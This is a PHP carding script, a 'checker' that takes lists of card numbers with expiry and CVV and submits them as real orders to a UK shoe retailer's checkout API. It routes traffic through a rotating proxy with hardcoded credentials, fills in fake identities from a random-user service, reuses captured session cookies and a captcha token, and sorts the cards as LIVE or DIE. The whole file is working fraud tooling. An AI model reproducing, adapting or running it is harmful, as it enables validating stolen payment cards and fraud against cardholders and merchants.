<?php 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

#----------------- [ WEBSHARE ]

$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'yqilhlxt-rotate:8yl0b1rgpie3',
    ); 
    $rotate = $rp1[array_rand($rp1)];
///             ==============[Proxy Section]===============            //
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead![".$rotate."] ❌";
}
//echo '[ IP: '.$ip.' ] ';

# -------------------- [1 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.russellandbromley.co.uk/ccstoreui/v1/orders/price');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.russellandbromley.co.uk',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'cookie: ccstoreroute=c6815ca81a3760c053f09c293fcd380e; xvl1556639c1PRD_siteUS=408765c%3A17dabe8ab01%3A5ad0-4094297359; ak_bmsc=3C8F0403FFB0238D066879D9FEBA1CF2~000000000000000000000000000000~YAAQDBQgF4juo5d9AQAAc+oErg5021dVVGpVUgJ9cYXhUNrdzXMTDp7dmp5d76kVMeS0H1To5v8i7kR357wZ3pMYNc8en3/DgnPksWodySoUW/py8N1nwgTdwLlB77vWJvEZeOtD/gxHVoEk5jR635yV0B5GlwIF4bsDxTlp9Mi12RGSt164yJxvsFp9mN6LiyKQO6+Zb+0O7nsMYpk4wE/fgUseENPqzMG8PAE79Kmyq60OMMBh+BJ+OTeJxX0vzFqeUXlPIc87Qx5ELxWPG5hK/bPcDePJ/BYmvGSeXhQNVVbx5rkXLGQj5nw/2se7YTMOJGC2+6nFePrf/9SMcOnkiR2gCemcCB9UrT5LJjOVTnZ8q4c4h4KMVBnoD/QxNtY/FGzAjW4xqQ0P6wyJHfPquWCSnA==; xdl1556639c1PRD_siteUS=1138kR4nU6BQ9QQo-JAoXImYO1aICPXilRZ50iaCl0O77SQEC3A%3A1639302102074%3A1639302102074%3A1639302102074%3A2%3A2; atgRecVisitorId=1138kR4nU6BQ9QQo-JAoXImYO1aICPXilRZ50iaCl0O77SQEC3A; emailSubsCookie=success; JSESSIONID=ryWuEaB8EdAEiYcTjLkU3kqKXmQ2a8l1hYqadzyootWQn1XzbPht!208103092; AKA_A2=A; occsRecVisitorId=%221138kR4nU6BQ9QQo-JAoXImYO1aICPXilRZ50iaCl0O77SQEC3A%22; occsRecSessionId=%22151518994502149745140199451214004549539556485648%22; cookies-accepted=true; GDPRCookieP13nConsentGranted=true; GDPRProfileP13nConsentGranted=true; GDPRProfileP13nConsentDate=1639303282420',
'origin: https://www.russellandbromley.co.uk',
'referer: https://www.russellandbromley.co.uk/checkout',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"shoppingCart":{"items":[{"productId":"705882","quantity":1,"repositoryId":"ci338077894","availabilityDate":null,"catRefId":"705882000","expanded":false,"stockStatus":true,"stockState":"IN_STOCK","commerceItemQuantity":1,"soldAsPackage":true,"assetable":false,"shippable":true,"allowVirtualShippingGroup":false,"isVirtualShippingGroup":false,"selectedOptions":[],"discountInfo":[],"rawTotalPrice":195,"detailedItemPriceInfo":[{"discounted":false,"secondaryCurrencyTaxAmount":0,"amount":195,"quantity":1,"configurationDiscountShare":0,"tax":0,"orderDiscountShare":0,"detailedUnitPrice":195,"currencyCode":"GBP"}],"externalData":[],"addOnItem":false,"x_gcIssueTime":null,"x_gcInfo":null,"displayName":"ROWAN","invalid":false,"commerceItemId":"ci338077885","priceListGroupId":"testbbpPriceGroup","giftWithPurchaseCommerceItemMarkers":[],"price":195}],"coupons":[]},"combineLineItems":"yes","payments":[],"pickupStoreID":null,"loyalty_id":null,"delivery_comment":null,"raw_message":null,"x_lastName":"","x_title":null,"is_anonymousCheckout":true,"x_tmp_captcha":"03AGdBq25HuvqNwcyaQLMMBBvoSVE2SncM7qEqDeIQr0QGo-JsRwclHXxpRrgITR6bt5e72MqR0z7Koneerig7Wrip2U2m5ij5ulcydDFoSR34gB5vcews_QqY8D6QUrLWyzj0JA14l4dkWJRzkHjfUiG0az2K7cySns0F5UgPqpRfLiEOVpSJ1NHurfxGB2UmK2_Bkoz1xJxzYwfNEOkmtHfgC8jZ1ptBns7AYrllcr1PRt1h4zYvGrH4EYd895QCo-BPo33Vf_QtxQYzsIo6pmEeHl2zNgtXNKfU6lj80spHW-h1d2LRPFh5xdH8SNUAqrH6vcbza23rKZ3qe3G1oOTD56cWelV7z9SxxbtHJwJClWjFz-j5D-iAxvUW3e_Bf2hXgiRf3jgPsOUvybVia8m-FgsAPPgGxAFxYZGdCQaH_u6ngghg1IVupyIOc6so4gEhX3PDGkFYntfPmjsfM2iIxKhUDOV3A--6FYivlhVjVKirB3LCHOFlkn6h8965TSp_DDMkw08z96bJS5b4h7KGG2WlF5iKlA","shippingMethod":{"value":"100003"},"shippingAddress":{"alias":"","prefix":"Mr","firstName":"David","middleName":"","lastName":"Joe","suffix":"","country":"United Kingdom","postalCode":"PE20 4AS","address1":"82 Ramsgate Rd","address2":"","address3":"","city":"Wigtoft","state":"England","county":"United Kingdom","phoneNumber":"078 2041 6697","email":null,"jobTitle":"","companyName":"","faxNumber":"","addressType":[],"type":"","repositoryId":"","isDefaultBillingAddress":false,"isDefaultShippingAddress":false,"predefinedAddressTypes":[],"isTypeModified":false,"computedDefaultBilling":false,"computedDefaultShipping":false,"selectedCountry":"GB","selectedState":"ENG","state_ISOCode":"GB-ENG","defaultCountryCode":"GB","selectedAddressTypes":[],"isDefaultAddress":false,"dynamicProperties":[],"computedAddressType":[],"computedCountry":["GB"],"computedState":["ENG"],"types":[]},"populateShippingMethods":true,"checkout":true}');
$result1 = curl_exec($ch);

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.russellandbromley.co.uk/ccstoreui/v1/orders');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.russellandbromley.co.uk',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'cookie: ccstoreroute=c6815ca81a3760c053f09c293fcd380e; xvl1556639c1PRD_siteUS=408765c%3A17dabe8ab01%3A5ad0-4094297359; ak_bmsc=3C8F0403FFB0238D066879D9FEBA1CF2~000000000000000000000000000000~YAAQDBQgF4juo5d9AQAAc+oErg5021dVVGpVUgJ9cYXhUNrdzXMTDp7dmp5d76kVMeS0H1To5v8i7kR357wZ3pMYNc8en3/DgnPksWodySoUW/py8N1nwgTdwLlB77vWJvEZeOtD/gxHVoEk5jR635yV0B5GlwIF4bsDxTlp9Mi12RGSt164yJxvsFp9mN6LiyKQO6+Zb+0O7nsMYpk4wE/fgUseENPqzMG8PAE79Kmyq60OMMBh+BJ+OTeJxX0vzFqeUXlPIc87Qx5ELxWPG5hK/bPcDePJ/BYmvGSeXhQNVVbx5rkXLGQj5nw/2se7YTMOJGC2+6nFePrf/9SMcOnkiR2gCemcCB9UrT5LJjOVTnZ8q4c4h4KMVBnoD/QxNtY/FGzAjW4xqQ0P6wyJHfPquWCSnA==; xdl1556639c1PRD_siteUS=1138kR4nU6BQ9QQo-JAoXImYO1aICPXilRZ50iaCl0O77SQEC3A%3A1639302102074%3A1639302102074%3A1639302102074%3A2%3A2; atgRecVisitorId=1138kR4nU6BQ9QQo-JAoXImYO1aICPXilRZ50iaCl0O77SQEC3A; emailSubsCookie=success; JSESSIONID=ryWuEaB8EdAEiYcTjLkU3kqKXmQ2a8l1hYqadzyootWQn1XzbPht!208103092; AKA_A2=A; occsRecVisitorId=%221138kR4nU6BQ9QQo-JAoXImYO1aICPXilRZ50iaCl0O77SQEC3A%22; occsRecSessionId=%22151518994502149745140199451214004549539556485648%22; cookies-accepted=true; GDPRCookieP13nConsentGranted=true; GDPRProfileP13nConsentGranted=true; GDPRProfileP13nConsentDate=1639303282420',
'origin: https://www.russellandbromley.co.uk',
'referer: https://www.russellandbromley.co.uk/checkout',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"shoppingCart":{"items":[{"productId":"705882","quantity":1,"catRefId":"705882000","giftWithPurchaseCommerceItemMarkers":[],"externalData":[],"commerceItemId":"ci338077885","x_gcIssueTime":null,"x_gcInfo":null}],"coupons":[],"orderTotal":200},"appliedPromotions":[],"isAnonymousCheckout":true,"combineLineItems":"yes","shippingAddress":{"alias":"","prefix":"Mr","firstName":"David","middleName":"","lastName":"Joe","suffix":"","country":"United Kingdom","postalCode":"PE20 4AS","address1":"82 Ramsgate Rd","address2":"","address3":"","city":"Wigtoft","state":"England","county":"United Kingdom","phoneNumber":"078 2041 6697","email":"cloneblackhat1@gmail.com","jobTitle":"","companyName":"","faxNumber":"","addressType":[],"type":"","repositoryId":"","isDefaultBillingAddress":false,"isDefaultShippingAddress":false,"predefinedAddressTypes":[],"isTypeModified":false,"computedDefaultBilling":false,"computedDefaultShipping":false,"selectedCountry":"GB","selectedState":"ENG","state_ISOCode":"GB-ENG","defaultCountryCode":"GB","selectedAddressTypes":[],"isDefaultAddress":false,"dynamicProperties":[],"computedAddressType":[],"computedCountry":["GB"],"computedState":["ENG"],"afterValidation":true,"types":[]},"shippingMethod":{"value":"100003"},"billingAddress":{"alias":"","prefix":"Mr","firstName":"David","middleName":"","lastName":"Joe","suffix":"","country":"United Kingdom","postalCode":"PE20 4AS","address1":"82 Ramsgate Rd","address2":"","address3":"","city":"Wigtoft","state":"England","county":"United Kingdom","phoneNumber":"078 2041 6697","jobTitle":"","companyName":"","faxNumber":"","addressType":[],"type":"","repositoryId":"","isDefaultBillingAddress":false,"isDefaultShippingAddress":false,"predefinedAddressTypes":[],"isTypeModified":false,"computedDefaultBilling":false,"computedDefaultShipping":false,"selectedCountry":"GB","selectedState":"ENG","state_ISOCode":"GB-ENG","defaultCountryCode":"GB","isDefaultAddress":false,"types":[],"email":null},"payments":[{"nameOnCard":"'.$firstname.' '.$lastname.'","cardType":"visa","cardNumber":"'.$cc.'","cardCVV":"'.$cvv.'","endMonth":"'.$mes.'","endYear":'.$ano.',"selectedCardType":"visa","selectedEndMonth":"'.$mes.'","selectedEndYear":'.$ano.',"customProperties":{"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36","acceptHeader":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","shopperIP":"27.77.211.41","deviceFingerprint":"l2GGRblbcM0040000000000000pgIOdGFwF00050271576cVB94iKzBGov2tJdkRqKswEtLkIt16002DYGD68H6EF00000qZkTE00000ZFzs57LvrWoujiZi0YMy:40"},"type":"card"}],"visitorId":"1138kR4nU6BQ9QQo-JAoXImYO1aICPXilRZ50iaCl0O77SQEC3A","visitId":"408765c:17dabe8ab01:5ad0-4094297359","placeAsyncOrder":false,"op":"complete","giftWithPurchaseOrderMarkers":[],"pickupStoreID":null,"loyalty_id":null,"delivery_comment":null,"raw_message":null,"x_lastName":"","x_title":null,"is_anonymousCheckout":true,"x_tmp_captcha":"03AGdBq25HuvqNwcyaQLMMBBvoSVE2SncM7qEqDeIQr0QGo-JsRwclHXxpRrgITR6bt5e72MqR0z7Koneerig7Wrip2U2m5ij5ulcydDFoSR34gB5vcews_QqY8D6QUrLWyzj0JA14l4dkWJRzkHjfUiG0az2K7cySns0F5UgPqpRfLiEOVpSJ1NHurfxGB2UmK2_Bkoz1xJxzYwfNEOkmtHfgC8jZ1ptBns7AYrllcr1PRt1h4zYvGrH4EYd895QCo-BPo33Vf_QtxQYzsIo6pmEeHl2zNgtXNKfU6lj80spHW-h1d2LRPFh5xdH8SNUAqrH6vcbza23rKZ3qe3G1oOTD56cWelV7z9SxxbtHJwJClWjFz-j5D-iAxvUW3e_Bf2hXgiRf3jgPsOUvybVia8m-FgsAPPgGxAFxYZGdCQaH_u6ngghg1IVupyIOc6so4gEhX3PDGkFYntfPmjsfM2iIxKhUDOV3A--6FYivlhVjVKirB3LCHOFlkn6h8965TSp_DDMkw08z96bJS5b4h7KGG2WlF5iKlA"}');


$result2 = curl_exec($ch);

# ---------------------------------------#

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

# ---------------- [Responses] ----------------- #

if(strpos($result2, '"message":"DECLINED : CVC Declined"')) {
    echo '<span class="">LIVE</span> | </span> </span> <span class="">'.$lista.'</span> | <span> R2 => CVC DECLINED [ADYEN]</span> </span> <span class=""> </span> </br>';
}

elseif(strpos($result2, '"paymentState":"AUTHORIZE_SUCCESS"')) {
    echo '<span class="">LIVE</span> | </span> </span> <span class="">'.$lista.'</span> | <span> R2 => CVV MATCHED [AUTHORIZE_SUCCESS]</span> </span> <span class=""> </span> </br>';
}

elseif(strpos($result2, '"message":"Checkout Success"')) {
    echo '<span class="">LIVE</span> | </span> </span> <span class="">'.$lista.'</span> | <span> R2 => SUCCESSFUL PAY 60$</span> </span> <span class=""> </span> </br>';
}

elseif(strpos($result2, '"message":"Your order has not been placed as payment has been declined. Please try again."')) {
    echo '<span class="">DIE</span> | </span> </span> <span class="">'.$lista.'</span> | <span> R2 => PAYMENT HAS BEEN DECLINED</span> </span> <span class=""> </span> </br>';
}

elseif(strpos($result2, '"DECLINED : Invalid Card Number"')) {
    echo '<span class="">DIE</span> | </span> </span> <span class="">'.$lista.'</span> | <span> R2 => INVALID CARD NUMBER</span> </span> <span class=""> </span> </br>';
}

elseif(strpos($result2, '"message":"DECLINED : FRAUD"')) {
    echo '<span class="">DIE</span> | </span> </span> <span class="">'.$lista.'</span> | <span> R2 => DECLINED: FRAUD</span> </span> <span class=""> </span> </br>';
}

elseif(strpos($result2, '"message":"Order submission failed"')) {
    echo '<span class="">DIE</span> | </span> </span> <span class="">'.$lista.'</span> | <span> R2 => ORDER SUBMISSION FAILED [STATUS: 500]</span> </span> <span class=""> </span> </br>';
}

else {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> DIE ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card was Declined due to an Unknown Error [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
    echo $result1;
    echo $result2;
    
}

curl_close($ch);
ob_flush();

// echo "<b>1REQ Result:</b> $result1<br><br>";
// echo "<b>2REQ Result:</b> $result2<br><br>";
?>